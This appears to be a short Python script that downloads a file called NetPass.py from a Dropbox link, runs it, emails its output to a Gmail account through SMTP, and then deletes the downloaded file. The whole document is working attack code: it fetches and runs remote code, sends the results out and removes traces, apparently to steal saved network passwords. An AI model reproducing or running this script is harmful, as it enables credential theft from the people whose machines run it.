import subprocess 
import wget
import smtplib

def Downloader(url , file) :
    wget.download(url , file)
def sending_mail(email, password , message) :
    server = smtplib.SMTP("smtp.gmail.com" , 587)
    server.starttls()
    server.login(email , password)
    server.sendmail(email , email , message)
    server.quit()


Downloader("https://dl.dropboxusercontent.com/s/b32iy3m6b6glspw/NetPass.py?dl=1" , "kk.py")
Command_result = subprocess.check_output("python kk.py" , shell=True)
sending_mail("Email", "Password", Command_result)
subprocess.check_output("del kk.py" , shell=True)
